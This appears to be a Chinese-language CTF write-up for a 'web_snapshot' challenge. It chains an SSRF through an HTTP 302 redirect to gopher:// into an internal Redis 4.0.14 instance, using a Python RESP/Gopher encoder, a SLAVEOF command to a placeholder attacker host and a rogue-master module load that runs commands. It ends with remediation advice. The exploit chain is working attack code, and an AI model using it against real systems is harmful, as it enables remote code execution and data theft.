# web_snapshot

## 题目简述

题目使用 cURL 抓取用户指定的网页，再把响应保存到内网 Redis。入口只允许 `http://` 和 `https://`，但 cURL 开启了自动重定向且没有限制重定向后的协议；在题目镜像所带的 libcurl 中，可以从 HTTP 302 跳转到 `gopher://db:6379`。由此可向 Redis 4.0.14 写入任意 RESP 命令，并通过恶意主库复制模块实现 RCE。

## 解题过程

### 1. 从 HTTP 白名单跨到内网 Redis

关键代码是：

```php
if (!preg_match('/^https?:\/\/.*$/', $url)) {
    return 'Invalid URL';
}

curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$data = curl_exec($curl);
```

正则只检查最初提交的 URL。代码设置了 `CURLOPT_FOLLOWLOCATION`，却没有通过 `CURLOPT_PROTOCOLS` 和 `CURLOPT_REDIR_PROTOCOLS` 限制初始请求及重定向可用的协议；题目所用 libcurl 因而会接受重定向后的 `gopher://`。让该 URL 返回如下响应：

```http
HTTP/1.1 302 Found
Location: gopher://db:6379/_<URL_ENCODED_RESP>
Connection: close
```

`db` 不是猜测出的地址，而是 `docker-compose.yml` 给 Redis 服务设置的主机名。Redis 容器版本为 `4.0.14`，flag 则通过该容器的 `FLAG` 环境变量注入。

下面的脚本把命令数组编码为 RESP，再生成两阶段 Gopher URL：

```python
from urllib.parse import quote_from_bytes

def encode_resp(commands):
    result = bytearray()
    for command in commands:
        result += f"*{len(command)}\r\n".encode()
        for argument in command:
            raw = argument.encode()
            result += f"${len(raw)}\r\n".encode()
            result += raw + b"\r\n"
    return bytes(result)

def gopher(commands):
    data = quote_from_bytes(encode_resp(commands), safe="")
    return "gopher://db:6379/_" + data

attacker_ip = "<ATTACKER_IP_REACHABLE_BY_REDIS>"
rogue_port = "21000"

stage1 = [
    ["CONFIG", "SET", "dir", "/tmp"],
    ["CONFIG", "SET", "dbfilename", "exp.so"],
    ["SLAVEOF", attacker_ip, rogue_port],
    ["QUIT"],
]

stage2 = [
    ["SLAVEOF", "NO", "ONE"],
    ["MODULE", "LOAD", "/tmp/exp.so"],
    ["system.exec", "env"],
    ["QUIT"],
]

print(gopher(stage1))
print(gopher(stage2))
```

每个地址分别放进一个可从题目容器访问的 HTTP 302 页面，再向 Web Snapshot 提交该 HTTP 页面，而不是直接提交 Gopher URL。

### 2. 通过主从复制写入恶意模块

Redis 主从复制会把主库提供的同步数据保存到从库配置的 `dir/dbfilename`。利用工具需要完成两件事：作为伪造主库响应复制握手，并把包含系统命令执行功能的 `exp.so` 当作同步文件发送。可使用 [Dliv3/redis-rogue-server](https://github.com/Dliv3/redis-rogue-server)；该仓库附带 `exp.so`，其 `--server-only` 模式只监听并等待内网 Redis 反连，正好适用于本题的 SSRF 场景：

```bash
python3 redis-rogue-server.py --server-only
```

确认监听端口与脚本中的 `rogue_port` 一致，并确保 `<ATTACKER_IP_REACHABLE_BY_REDIS>` 可被 Redis 容器访问。随后按顺序操作：

1. 提交 stage 1 的 HTTP 页面，先设置 `/tmp/exp.so`，再令 Redis 连接伪造主库；
2. 等待工具日志确认模块文件已经同步；
3. 提交 stage 2 的 HTTP 页面，停止复制、加载模块并执行 `env`；
4. 打开 Web Snapshot 返回的缓存链接，在 Redis 响应中找到 `FLAG=...`。

伪造主库收到 Redis 的复制请求后，会出现 `PSYNC`、`FULLRESYNC` 和载荷发送完成等日志：

```text
BINDING 0.0.0.0:21000
Waiting for connection...
[->] PSYNC ...
[<-] +FULLRESYNC ...
Payload sent
```

模块命令返回的环境变量中包含：

```text
FLAG=0xGame{aef421d4-0f35-4b82-b7ee-0dbea46b6333}
```

必须拆成两次请求：若刚执行 `SLAVEOF` 就立即执行 `SLAVEOF NO ONE`，复制尚未完成便会被取消。每个阶段末尾加入 `QUIT`，则是为了让 Redis 主动结束 Gopher 连接，避免 cURL 一直等待。

## 方法总结

本题的核心链条是“仅检查初始协议的 SSRF → HTTP 302 协议跳转 → Gopher 注入 Redis RESP → Redis 主从复制写模块 → 模块命令执行”。修复时应同时限制初始 URL 与每次重定向的协议和目标地址，禁止访问内网网段，并为 Redis 启用认证、最小权限和危险命令限制；只修入口正则不能阻止重定向绕过。
